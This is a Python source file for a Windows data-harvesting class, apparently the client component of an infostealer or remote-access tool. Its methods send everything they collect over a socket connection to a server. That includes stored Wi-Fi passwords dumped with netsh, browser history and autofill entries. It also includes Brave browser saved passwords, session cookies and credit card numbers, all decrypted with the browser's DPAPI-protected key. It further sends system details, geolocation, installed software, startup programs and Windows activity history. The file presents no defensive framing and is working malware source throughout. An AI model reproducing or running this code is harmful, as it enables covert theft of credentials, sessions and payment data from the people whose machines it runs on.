import platform
from getmac import get_mac_address as gma
import requests
import subprocess
import re
import os
import winreg
from win32api import GetSystemMetrics
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import psutil
import struct
import getpass
from datetime import timedelta
import datetime



class SystemInfoHarvester:

        #returns client system information to the server
        def get_platform_info(self, conn):
            sys_info = []

            sys_info.append(gma())
            sys_info.extend([platform.uname().system,
                             platform.uname().node,
                             platform.uname().release,
                             platform.uname().version,
                             platform.uname().machine,
                             str(datetime.date.today()),
                             str(datetime.datetime.now().time())
                             ])
            sys_info.append(getpass.getuser())

            sys_info = " ".join(sys_info)
            conn.send(sys_info.encode())


        #extracts scree width and height and sends back to server
        def extract_other_info(self, conn):
            result = []

            result.append({"Screen Width": GetSystemMetrics(0), "Screen Height": GetSystemMetrics(1)})

            response = requests.get("http://www.geoplugin.net/json.gp?ip")
            if response.status_code == 200:
                locationData = response.json()
                result.append({"geoplugin_request": locationData["geoplugin_request"],
                               "geoplugin_city": locationData["geoplugin_city"],
                               "geoplugin_region": locationData["geoplugin_region"],
                               "geoplugin_countryName": locationData["geoplugin_countryName"],
                               "Timezone": locationData["geoplugin_timezone"],
                               "Latitude": locationData["geoplugin_latitude"],
                               "Longitude": locationData["geoplugin_longitude"]
                               })

            otherData = json.dumps(result)
            otherData = struct.pack('>I', len(otherData)) + otherData.encode()
            conn.sendall(otherData)



        # gets all know Wi-Fi password on machine and sends back to server
        def get_wifi_password(self, conn):
            result = []

            try:
                wifi_name_list = []
                # send command to terminal
                terminal_cmd = "netsh wlan show profiles"
                wifi_name_result = subprocess.Popen(terminal_cmd, shell=True, stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                # store result from terminal
                wifi_name = (wifi_name_result.stdout.read() + wifi_name_result.stderr.read()).decode().split("\n")

                # get all SSID and store them in wifi_name_list
                for name in wifi_name:
                    if "All User Profile" in name:
                        res = name.partition(": ")[2]
                        res = res.replace("\r", "")
                        wifi_name_list.append(res)

                for wifi in wifi_name_list:  # loop through Wi-Fi name
                    terminal_cmd = "netsh wlan show profiles {} key=clear".format(str(wifi))
                    wifi_password = subprocess.Popen(terminal_cmd, shell=True, stdout=subprocess.PIPE,
                                                     stderr=subprocess.PIPE,
                                                     stdin=subprocess.PIPE)
                    wifi_password = (wifi_password.stdout.read() + wifi_password.stderr.read()).decode()

                    try:  # get password next to "Key content"
                        wifi_password = re.search("(?<=Key Content).*", wifi_password)[
                            0]  # positive lookbehind assertion regex
                        result.append({wifi: wifi_password.lstrip().rstrip()})
                    except:  # if password does not exist label Wi-Fi as open Wi-Fi
                        result.append({wifi: '(Open Wifi)'})

                wifiPasswordCredentials = json.dumps(result)
                wifiPasswordCredentials = struct.pack('>I', len(wifiPasswordCredentials)) + wifiPasswordCredentials.encode()
                conn.sendall(wifiPasswordCredentials)

            except Exception as e:
                result.append({"Error": e})
                wifiPasswordCredentials = json.dumps(result)
                wifiPasswordCredentials = struct.pack('>I', len(wifiPasswordCredentials)) + wifiPasswordCredentials.encode()
                conn.sendall(wifiPasswordCredentials)



        def get_installed_apps(self, hive, flag):
            software_list = []

            try:
                aReg = winreg.ConnectRegistry(None, hive)
                aKey = winreg.OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                                      0, winreg.KEY_READ | flag)

                count_subkey = winreg.QueryInfoKey(aKey)[0]

                for i in range(count_subkey):
                    software = {}
                    try:
                        asubkey_name = winreg.EnumKey(aKey, i)
                        asubkey = winreg.OpenKey(aKey, asubkey_name)
                        software['name'] = winreg.QueryValueEx(asubkey, "DisplayName")[0]

                        try:
                            software['version'] = winreg.QueryValueEx(asubkey, "DisplayVersion")[0]
                        except EnvironmentError:
                            software['version'] = 'undefined'
                        try:
                            software['publisher'] = winreg.QueryValueEx(asubkey, "Publisher")[0]
                        except EnvironmentError:
                            software['publisher'] = 'undefined'
                        software_list.append(software)
                    except EnvironmentError:
                        continue
                return software_list

            except Exception as e:
                software_list.append(e)
                return software_list


        #extracts installed apps and sends back to server
        def send_installed_apps(self, conn):
            result = []

            try:
                software_list = self.get_installed_apps(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + self.get_installed_apps(
                    winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + self.get_installed_apps(winreg.HKEY_CURRENT_USER, 0)

                for software in software_list:
                    result.append({'Software-Name': software['name'], 'Software-Version': software['version'],  'Software-Publisher': software['publisher']})

                installedApps = json.dumps(result)
                installedApps = struct.pack('>I', len(installedApps)) + installedApps.encode()
                conn.sendall(installedApps)

            except Exception as e:
                result.append({"Error": e})
                installedApps = json.dumps(result)
                installedApps = struct.pack('>I', len(installedApps)) + installedApps.encode()
                conn.sendall(installedApps)



        #============================Browsing Data Extraction====================================
        #delete copied database
        def delete_browser_db(self, filename):
            try:
                os.remove(filename)
            except:
                pass



        # converts Chrome timestamp to date and time
        def convert_chrome_datetime(self, chromedate):
            if chromedate != 86400000000 and chromedate:
                try:
                    return datetime.datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                except:
                    return chromedate
            else:
                return ""



        # retrieves the encryption key
        def get_encryption_key(self):
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                            "User Data", "Local State")

            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            # decode the encryption key from Base64
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # remove dpapi
            # Decrypts data that was encrypted using win32crypt::CryptProtectData
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


        #decrypts data passed in with encryption key
        def decrypt_data(self, data, key):
            try:
                iv = data[3:15]
                data = data[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(data)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                except:
                    # not supported
                    return ""


        #extracts saved password from browser and sends back to server
        def get_browser_passwords(self, conn):
            result = []

            try:
                encryption_key = self.get_encryption_key()
                # local sqlite Chrome database path
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                       "User Data", "default", "Login Data")

                filename = "loginData.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)


                db = sqlite3.connect(filename)
                cursor = db.cursor()
                # `logins` table has the data we need
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = self.decrypt_data(row[3], encryption_key)
                    date_created = row[4]
                    date_last_used = row[5]

                    #check if username or password is present
                    if username or password:
                        date_created = str(self.convert_chrome_datetime(date_created))
                        date_last_used = str(self.convert_chrome_datetime(date_last_used))
                        result.append({'Origin URL': origin_url, 'Action URL' : action_url,  'Username': username, 'Password':password, 'Date Created': date_created, 'Date Last Used': date_last_used})
                    else:
                        continue

                cursor.close()
                db.close()

                self.delete_browser_db(filename)

                browserPasswordData = json.dumps(result)
                browserPasswordData = struct.pack('>I', len(browserPasswordData)) + browserPasswordData.encode()
                conn.sendall(browserPasswordData)

            except Exception as e:
                result.append({"Error": e})
                browserPasswordData = json.dumps(result)
                browserPasswordData = struct.pack('>I', len(browserPasswordData)) + browserPasswordData.encode()
                conn.sendall(browserPasswordData)



        #extract browsing cookies from browser and sends back to server
        def get_browser_cookies(self, conn):
            result = []

            try:
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data",
                                       "Default", "Network", "Cookies")
                filename = "cookies.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)

                db = sqlite3.connect(filename)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                cursor.execute(
                    """SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")

                key = self.get_encryption_key()
                for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                    if not value:
                        decrypted_value = self.decrypt_data(encrypted_value, key)
                    else:
                        decrypted_value = value

                    result.append({'Host': host_key, 'Cookie name': name, 'Cookie value (decrypted)': f'({decrypted_value})',
                                   'Creation datetime (UTC)': str(self.convert_chrome_datetime(creation_utc)),
                                   'Last access datetime (UTC)': str(self.convert_chrome_datetime(last_access_utc)),
                                   'Expires datetime (UTC)':str(self.convert_chrome_datetime(expires_utc))})

                # close connection
                db.close()
                self.delete_browser_db(filename)

                cookieData =  json.dumps(result)
                cookieData = struct.pack('>I', len(cookieData)) + cookieData.encode()
                conn.sendall(cookieData)

            except Exception as e:
                result.append({"Error": e})
                cookieData = json.dumps(result)
                cookieData = struct.pack('>I', len(cookieData)) + cookieData.encode()
                conn.sendall(cookieData)


        #extract browsing history from browser and sends back to server
        def retrieve_browser_history(self, conn):
            result = []

            try:
                db_path = os.path.join(os.environ["USERPROFILE"],
                                       "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                       "User Data", "Default", "History")

                filename = "webHistory.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)

                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT id, url, title, visit_count, typed_count, last_visit_time from urls")
                browsing_data = (cursor.fetchall())

                for record in browsing_data:
                    id = record[0]
                    url = record[1]
                    title = record[2]
                    visit_count = record[3]
                    typed_count = record[4]
                    last_visit_time = self.convert_chrome_datetime(record[5])

                    result.append( {'URL': url, 'Website title': title,
                                                                'Visit Count': str(visit_count), 'Typed Count': str(typed_count),
                                                                'Last visit time': str(last_visit_time)})

                db.close()
                self.delete_browser_db(filename)

                browserHistoryData = json.dumps(result)
                browserHistoryData = struct.pack('>I', len(browserHistoryData)) + browserHistoryData.encode()
                conn.sendall(browserHistoryData)

            except Exception as e:
                result.append({"Error": e})
                browserHistoryData = json.dumps(result)
                browserHistoryData = struct.pack('>I', len(browserHistoryData)) + browserHistoryData.encode()
                conn.sendall(browserHistoryData)


        #extracts credit card info from browser and sends back to server
        def retrieve_creditcard_info(self, conn):
            result = []

            try:
                key = self.get_encryption_key()
                db_path = os.path.join(os.environ["USERPROFILE"],
                                       "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                       "User Data", "Default", "Web Data")

                filename = "webData.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)

                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT * FROM credit_cards")

                for item in cursor.fetchall():
                    username = item[1]
                    encrypted_password = item[4]
                    card_number = self.decrypt_data(encrypted_password, key)
                    expire_mon = item[2]
                    expire_year = item[3]

                    result.append({"Username": username, "Card Number": card_number, "Expiry Month": expire_mon,
                                   "Expiry Year": expire_year})

                db.close()
                self.delete_browser_db(filename)

                creditCardData = json.dumps(result)
                creditCardData = struct.pack('>I', len(creditCardData)) + creditCardData.encode()
                conn.sendall(creditCardData)

            except Exception as e:
                result.append({"Error": e})
                creditCardData = json.dumps(result)
                creditCardData = struct.pack('>I', len(creditCardData)) + creditCardData.encode()
                conn.sendall(creditCardData)



        #extracts autofill data from browser and sends back to server
        def retrieve_autofill_info(self, conn):
            result = []

            try:
                db_path = os.path.join(os.environ["USERPROFILE"],
                                       "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                       "User Data", "Default", "Web Data")

                filename = "webData.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)

                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT name, value FROM autofill")

                for item in cursor.fetchall():
                    name = item[0]
                    value = item[1]
                    result.append({"Name": name, "Value": f'({value})'})

                db.close()
                self.delete_browser_db(filename)

                autofillData = json.dumps(result)
                autofillData = struct.pack('>I', len(autofillData)) + autofillData.encode()
                conn.sendall(autofillData)

            except Exception as e:
                result.append({"Error": e})
                autofillData = json.dumps(result)
                autofillData = struct.pack('>I', len(autofillData)) + autofillData.encode()
                conn.sendall(autofillData)

        # ============================Browsing Data Extraction====================================



        # ============================Network Information Extraction==============================
        #extract memory data and sends back to server
        def extract_memory_info(self, conn):
            result = []

            try:
                # Get memory information
                mem_info = psutil.virtual_memory()._asdict()
                result.append(mem_info)

                memoryInfoData = json.dumps(result)
                memoryInfoData = struct.pack('>I', len(memoryInfoData)) + memoryInfoData.encode()
                conn.sendall(memoryInfoData)
            except Exception as e:
                result.append({"Error": e})
                memoryInfoData = json.dumps(result)
                memoryInfoData = struct.pack('>I', len(memoryInfoData)) + memoryInfoData.encode()
                conn.sendall(memoryInfoData)


        #extract disk information and sends back to server
        def extract_disk_info(self, conn):
            result = []
            try:
                disk_info = {}
                for part in psutil.disk_partitions():
                    part_info = psutil.disk_usage(part.mountpoint)._asdict()
                    disk_info[part.device] = part_info
                result.append(disk_info)

                diskInfoData = json.dumps(result)
                diskInfoData = struct.pack('>I', len(diskInfoData)) + diskInfoData.encode()
                conn.sendall(diskInfoData)

            except Exception as e:
                result.append({"Error": e})
                diskInfoData = json.dumps(result)
                diskInfoData = struct.pack('>I', len(diskInfoData)) + diskInfoData.encode()
                conn.sendall(diskInfoData)


        # extract network information and sends back to server
        def extract_network_info(self, conn):
            result = []

            try:
                net_info = {}
                for iface, addrs in psutil.net_if_addrs().items():
                    addr_info = []
                    for addr in addrs:
                        addr_info.append({
                            'family': addr.family.name,
                            'address': addr.address,
                            'netmask': addr.netmask,
                            'broadcast': addr.broadcast,
                        })
                    net_info[iface] = addr_info
                result.append(net_info)

                networkInfoData = json.dumps(result)
                networkInfoData = struct.pack('>I', len(networkInfoData)) + networkInfoData.encode()
                conn.sendall(networkInfoData)

            except Exception as e:
                result.append({"Error": e})
                networkInfoData = json.dumps(result)
                networkInfoData = struct.pack('>I', len(networkInfoData)) + networkInfoData.encode()
                conn.sendall(networkInfoData)


        # ============================Network Information Extraction==============================


        #extracts startup apps and sends back to server
        def get_user_startup_programs(self, conn):
            registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            startup_programs = []

            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_READ)
                counter = 0
                while True:
                    try:
                        value_name, value_data, value_type = winreg.EnumValue(key, counter)
                        if value_type == winreg.REG_SZ or value_type == winreg.REG_EXPAND_SZ:
                            startup_programs.append({"name": value_name, "path": value_data})
                        counter += 1
                    except OSError:
                        break
                winreg.CloseKey(key)

                startupAppData = json.dumps(startup_programs)
                startupAppData = struct.pack('>I', len(startupAppData)) + startupAppData.encode()
                conn.sendall(startupAppData)

            except Exception as e:
                startup_programs.append({"Error": e})
                networkInfoData = json.dumps(startup_programs)
                networkInfoData = struct.pack('>I', len(networkInfoData)) + networkInfoData.encode()
                conn.sendall(networkInfoData)


        def get_folder_name(self, path):
            entries = os.listdir(path)
            folders = [entry for entry in entries if os.path.isdir(os.path.join(path, entry))]
            userSid_folder = folders[0] if folders else None
            return userSid_folder



        #extracts user windows activity and send back to server
        def get_user_activity(self, conn):
            activities = []

            try:
                connectedDevicesPlatform_path = os.path.join(os.getenv('LOCALAPPDATA'), r'ConnectedDevicesPlatform')
                user_sid_path = self.get_folder_name(connectedDevicesPlatform_path)
                activitiesCache_path = os.path.join(os.getenv('LOCALAPPDATA'), r'ConnectedDevicesPlatform\{}'.format(user_sid_path),
                                                    'ActivitiesCache.db')

                # Connect to the database
                db_conn = sqlite3.connect(activitiesCache_path)
                cursor = db_conn.cursor()
                cursor.execute('SELECT * FROM Activity')
                rows = cursor.fetchall()
                column_names = [description[0] for description in cursor.description]

                for row in rows:
                    activity = dict(zip(column_names, row))
                    activity.pop('Id', None)
                    activity.pop('ParentActivityId', None)


                    if 'EndTime' and 'ExpirationTime' and'LastModifiedOnClient' and 'StartTime' and 'LastModifiedTime' in activity:
                        activity['EndTime'] =  str(datetime.datetime.utcfromtimestamp(activity['EndTime']))
                        activity['ExpirationTime'] = str(datetime.datetime.utcfromtimestamp(activity['ExpirationTime']))
                        activity['LastModifiedOnClient'] = str(datetime.datetime.utcfromtimestamp(activity['LastModifiedOnClient']))
                        activity['StartTime'] = str(datetime.datetime.utcfromtimestamp(activity['StartTime']))
                        activity['LastModifiedTime'] = str(datetime.datetime.utcfromtimestamp(activity['LastModifiedTime']))

                    # Convert the payload to a string
                    if 'Payload' in activity:
                        activity['Payload'] = str(activity['Payload'].decode())

                    activity = {k: '' if v is None else v for k, v in activity.items()}

                    try:
                        json.dumps(activity)
                        activities.append(activity)
                    except:
                        pass

                # Close the database connection
                db_conn.close()

                userActivityData = json.dumps(activities)
                userActivityData = struct.pack('>I', len(userActivityData)) + userActivityData.encode()
                conn.sendall(userActivityData)

            except Exception as e:
                activities.append({"Error": e})
                userActivityData = json.dumps(activities)
                userActivityData = struct.pack('>I', len(userActivityData)) + userActivityData.encode()
                conn.sendall(userActivityData)


